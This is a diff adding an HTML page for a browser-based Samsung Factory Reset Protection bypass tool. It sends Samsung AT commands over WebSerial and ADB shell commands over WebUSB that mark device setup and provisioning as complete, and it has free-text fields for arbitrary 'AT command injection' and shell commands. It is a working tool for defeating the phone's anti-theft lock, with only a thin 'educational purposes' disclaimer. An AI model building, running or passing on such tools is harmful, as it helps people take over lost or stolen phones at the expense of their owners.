@@ -1,0 +1,485 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="webadb.js"></script>
+    <title>OBSIDIAN // FRP BYPASS</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg: #050505;
+            --surface: #0a0a0a;
+            --surface-accent: #151515;
+            --border: #222;
+            --border-bright: #444;
+            --text-primary: #ffffff;
+            --text-secondary: #888;
+            --accent: #ffffff;
+            --danger: #ff3e3e;
+            --transition: 200ms cubic-bezier(0.2, 0, 0, 1);
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            cursor: crosshair;
+        }
+
+        body {
+            background-color: var(--bg);
+            color: var(--text-primary);
+            font-family: 'Inter', sans-serif;
+            line-height: 1.5;
+            overflow-x: hidden;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        /* Texture Overlay */
+        body::before {
+            content: "";
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3Update%3Cfilter id='noiseFilter'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.65' numOctaves='3' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noiseFilter)'/%3E%3C/svg%3E");
+            opacity: 0.03;
+            pointer-events: none;
+            z-index: 1000;
+        }
+
+        .layout {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 4rem 2rem;
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 2px;
+            background: var(--border);
+            border: 1px solid var(--border);
+        }
+
+        header {
+            grid-column: 1 / -1;
+            padding: 4rem 2rem;
+            background: var(--bg);
+            border-bottom: 1px solid var(--border);
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-end;
+        }
+
+        .title-block h1 {
+            font-size: 5rem;
+            font-weight: 900;
+            letter-spacing: -0.05em;
+            line-height: 0.8;
+            text-transform: uppercase;
+        }
+
+        .title-block p {
+            color: var(--text-secondary);
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.8rem;
+            margin-top: 1rem;
+            letter-spacing: 0.2em;
+        }
+
+        .module {
+            background: var(--surface);
+            padding: 3rem;
+            display: flex;
+            flex-direction: column;
+            gap: 2rem;
+            transition: var(--transition);
+        }
+
+        .module:hover {
+            background: var(--surface-accent);
+        }
+
+        .module-header {
+            border-left: 4px solid var(--accent);
+            padding-left: 1.5rem;
+        }
+
+        .module-header h2 {
+            font-size: 0.75rem;
+            text-transform: uppercase;
+            letter-spacing: 0.3em;
+            color: var(--text-secondary);
+            margin-bottom: 0.5rem;
+        }
+
+        .module-header h3 {
+            font-size: 1.5rem;
+            font-weight: 700;
+        }
+
+        .control-group {
+            display: flex;
+            flex-direction: column;
+            gap: 1rem;
+        }
+
+        .button-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
+            gap: 0.5rem;
+        }
+
+        button {
+            background: none;
+            border: 1px solid var(--border-bright);
+            color: var(--text-primary);
+            padding: 1rem;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.7rem;
+            text-transform: uppercase;
+            font-weight: 500;
+            transition: var(--transition);
+            text-align: left;
+            position: relative;
+            overflow: hidden;
+        }
+
+        button:hover {
+            background: var(--accent);
+            color: var(--bg);
+            border-color: var(--accent);
+        }
+
+        button:active {
+            transform: scale(0.98);
+        }
+
+        .btn-primary {
+            background: var(--text-primary);
+            color: var(--bg);
+            border: none;
+            font-weight: 700;
+            font-size: 0.8rem;
+            padding: 1.25rem;
+        }
+
+        select, input {
+            background: var(--bg);
+            border: 1px solid var(--border);
+            color: var(--text-primary);
+            padding: 1rem;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.8rem;
+            width: 100%;
+            outline: none;
+        }
+
+        input:focus {
+            border-color: var(--accent);
+        }
+
+        .terminal {
+            grid-column: 1 / -1;
+            background: #000;
+            height: 300px;
+            padding: 1.5rem;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.8rem;
+            color: #00ff41;
+            overflow-y: auto;
+            border-top: 1px solid var(--border);
+            position: relative;
+        }
+
+        .terminal::before {
+            content: "SYSTEM_LOG";
+            position: absolute;
+            top: 0.5rem;
+            right: 1rem;
+            font-size: 0.6rem;
+            color: #333;
+        }
+
+        .log-entry {
+            margin-bottom: 0.25rem;
+            opacity: 0.9;
+            animation: reveal 200ms ease-out forwards;
+        }
+
+        .log-entry.error { color: var(--danger); }
+        .log-entry.cmd { color: #aaa; }
+
+        @keyframes reveal {
+            from { opacity: 0; transform: translateY(5px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        footer {
+            grid-column: 1 / -1;
+            padding: 4rem 2rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.7rem;
+            color: var(--text-secondary);
+            border-top: 1px solid var(--border);
+        }
+
+        .notice-trigger {
+            text-decoration: underline;
+            text-underline-offset: 4px;
+        }
+
+        .notice-trigger:hover {
+            color: var(--accent);
+        }
+
+        .custom-input-wrap {
+            display: flex;
+            gap: 1px;
+            background: var(--border);
+        }
+
+        .custom-input-wrap button {
+            width: 100px;
+            flex-shrink: 0;
+            border: none;
+        }
+
+        @media (max-width: 900px) {
+            .layout { grid-template-columns: 1fr; }
+            .title-block h1 { font-size: 3.5rem; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="layout">
+        <header>
+            <div class="title-block">
+                <h1>SAMSUNG FRP</h1>
+                <p>CHROME BROWSER ONLY</p>
+            </div>
+            <div id="connection-status" style="font-family: 'JetBrains Mono'; font-size: 0.7rem; color: #444;">DISCONNECTED</div>
+        </header>
+
+        <!-- WebSerial Section -->
+        <section class="module">
+            <div class="module-header">
+                <h2>Interface 01</h2>
+                <h3>Serial AT Bridge</h3>
+            </div>
+
+            <div class="control-group">
+                <div style="display: flex; gap: 1px; background: var(--border);">
+                    <button id="connectButton" class="btn-primary" style="flex: 2;">Initialize Port</button>
+                    <select id="baudRate" style="flex: 1; border: none;">
+                        <option value="115200">115200</option>
+                        <option value="9600">9600</option>
+                        <option value="57600">57600</option>
+                    </select>
+                </div>
+            </div>
+
+            <div class="control-group">
+                <p style="font-size: 0.7rem; color: var(--text-secondary); text-transform: uppercase;">Sequence Control</p>
+                <div class="button-grid">
+                    <button onclick="sendCommand('AT+KSTRINGB=0,3\r\n')">Check Mode</button>
+                    <button onclick="sendCommand('AT+DUMPCTRL=1,0\r\n')">Dump</button>
+                    <button onclick="sendCommand('AT+DEBUGLVC=0,5\r\n')">Debug</button>
+                    <button onclick="sendCommand('AT+SWATD=0\r\n')">SWATD OFF</button>
+                    <button onclick="sendCommand('AT+ACTIVATE=0,0,0\r\n')">Activate</button>
+                    <button onclick="sendCommand('AT+SWATD=1\r\n')">SWATD ON</button>
+                </div>
+            </div>
+
+            <div class="control-group">
+                <div class="custom-input-wrap">
+                    <input type="text" id="customCommand" placeholder="AT COMMAND INJECTION...">
+                    <button onclick="sendCustomCommand()">Execute</button>
+                </div>
+            </div>
+        </section>
+
+        <!-- WebUSB ADB Section -->
+        <section class="module">
+            <div class="module-header">
+                <h2>Interface 02</h2>
+                <h3>USB ADB Bridge</h3>
+            </div>
+
+            <div class="control-group">
+                <button id="connectToPhone" class="btn-primary">Initialize Handshake</button>
+            </div>
+
+            <div class="control-group">
+                <p style="font-size: 0.7rem; color: var(--text-secondary); text-transform: uppercase;">Direct Shell Injection</p>
+                <div class="button-grid">
+                    <button onclick="sendCommandAdb('settings put global setup_wizard_has_run 1')">Wizard Fix</button>
+                    <button onclick="sendCommandAdb('settings put secure user_setup_complete 1')">User Fix</button>
+                    <button onclick="sendCommandAdb('content insert --uri content://settings/secure --bind name:s:DEVICE_PROVISIONED --bind value:i:1')">Provision</button>
+                    <button onclick="sendCommandAdb('content insert --uri content://settings/secure --bind name:s:user_setup_complete --bind value:i:1')">USC Set</button>
+                    <button onclick="sendCommandAdb('am start -c android.intent.category.HOME -a android.intent.action.MAIN')">Home</button>
+                    <button onclick="sendCommandAdb('reboot')">Reboot</button>
+                </div>
+            </div>
+
+            <div class="control-group">
+                <div class="custom-input-wrap">
+                    <input type="text" id="customCommandAdb" placeholder="SHELL COMMAND...">
+                    <button onclick="sendCustomCommandAdb()">Execute</button>
+                </div>
+            </div>
+        </section>
+
+        <div id="terminal" class="terminal">
+            <div class="log-entry">SYSTEM READY. WAITING FOR CONNECTION...</div>
+        </div>
+
+        <footer>
+            <div>DESIGNED BY SUDO-SELF // BYPASS SYSTEM</div>
+            <div class="notice-trigger" onclick="alert('Educational and research purposes only. Data loss is imminent. User assumes all liability.')">LEGAL_NOTICE.txt</div>
+        </footer>
+    </div>
+
+    <script>
+        let port = null;
+        let reader = null;
+        let writer = null;
+        var readableStreamClosed = null;
+        var writableStreamClosed = null;
+
+        function log(message, type = '') {
+            const logDiv = document.getElementById('terminal');
+            const entry = document.createElement('div');
+            entry.className = `log-entry ${type}`;
+            const timestamp = new Date().toLocaleTimeString([], { hour12: false, hour: '2-digit', minute: '2-digit', second: '2-digit' });
+            entry.innerHTML = `<span style="color: #333">[${timestamp}]</span> ${message}`;
+            logDiv.appendChild(entry);
+            logDiv.scrollTop = logDiv.scrollHeight;
+        }
+
+        async function connectSerial() {
+            try {
+                port = await navigator.serial.requestPort();
+                await port.open({
+                    baudRate: parseInt(document.getElementById('baudRate').value)
+                });
+
+                const textDecoder = new TextDecoderStream();
+                readableStreamClosed = port.readable.pipeTo(textDecoder.writable);
+                const textEncoder = new TextEncoderStream();
+                writableStreamClosed = textEncoder.readable.pipeTo(port.writable);
+
+                reader = textDecoder.readable.getReader();
+                writer = textEncoder.writable.getWriter();
+
+                log('SERIAL PORT OPENED');
+                document.getElementById('connectButton').textContent = 'TERMINATE';
+                document.getElementById('connection-status').textContent = 'SERIAL ACTIVE';
+                document.getElementById('connection-status').style.color = '#fff';
+                readLoop();
+            } catch (err) {
+                log('SERIAL ERROR: ' + err.message, 'error');
+            }
+        }
+
+        async function readLoop() {
+            try {
+                while (true) {
+                    const { value, done } = await reader.read();
+                    if (done) {
+                        reader.releaseLock();
+                        break;
+                    }
+                    log('RECV >> ' + value);
+                }
+            } catch (err) {
+                log('READ ERROR: ' + err.message, 'error');
+            }
+        }
+
+        async function sendCommand(command) {
+            if (!writer) {
+                log('ERROR: NO ACTIVE SERIAL SESSION', 'error');
+                return;
+            }
+            try {
+                log(command, 'cmd');
+                await writer.write(command);
+                await new Promise(resolve => setTimeout(resolve, 500));
+            } catch (err) {
+                log('SEND ERROR: ' + err.message, 'error');
+            }
+        }
+
+        function sendCustomCommand() {
+            const command = document.getElementById('customCommand').value + '\r\n';
+            sendCommand(command);
+        }
+
+        document.getElementById('connectButton').addEventListener('click', async () => {
+            if (port) {
+                try {
+                    if (reader) { await reader.cancel(); await readableStreamClosed.catch(() => {}); }
+                    if (writer) { await writer.close(); await writableStreamClosed; }
+                    await port.close();
+                    port = null;
+                    document.getElementById('connectButton').textContent = 'INITIALIZE PORT';
+                    document.getElementById('connection-status').textContent = 'DISCONNECTED';
+                    document.getElementById('connection-status').style.color = '#444';
+                    log('SERIAL DISCONNECTED');
+                } catch (err) {
+                    log('DISCONNECT ERROR: ' + err.message, 'error');
+                }
+            } else {
+                connectSerial();
+            }
+        });
+
+        // ADB Logic Integration
+        let adb;
+        async function initAdb() {
+            while (true) {
+                try {
+                    let webusb = await Adb.open("WebUSB");
+                    adb = await webusb.connectAdb("host::");
+                    log('ADB BRIDGE ESTABLISHED');
+                    document.getElementById('connection-status').textContent = 'ADB ACTIVE';
+                    document.getElementById('connection-status').style.color = '#fff';
+                    break;
+                } catch (error) {
+                    if (error.message.includes("host::")) {
+                        log('RETRYING ADB HANDSHAKE...', 'cmd');
+                        continue;
+                    } else {
+                        log('ADB ERROR: ' + error.message, 'error');
+                        throw error;
+                    }
+                }
+            }
+        }
+
+        async function sendCommandAdb(command) {
+            if (!adb) { log('ERROR: NO ADB HANDSHAKE', 'error'); return; }
+            try {
+                log('SHELL >> ' + command, 'cmd');
+                await adb.shell(command);
+                log('EXECUTION SUCCESS');
+            } catch (error) {
+                log('EXECUTION FAILED: ' + error.message, 'error');
+            }
+        }
+
+        async function sendCustomCommandAdb() {
+            const adbcommand = document.getElementById('customCommandAdb').value;
+            sendCommandAdb(adbcommand);
+        }
+
+        document.getElementById("connectToPhone").addEventListener('click', function () {
+            initAdb().catch(e => log(e.message, 'error'));
+        });
+    </script>
+</body>
+</html>
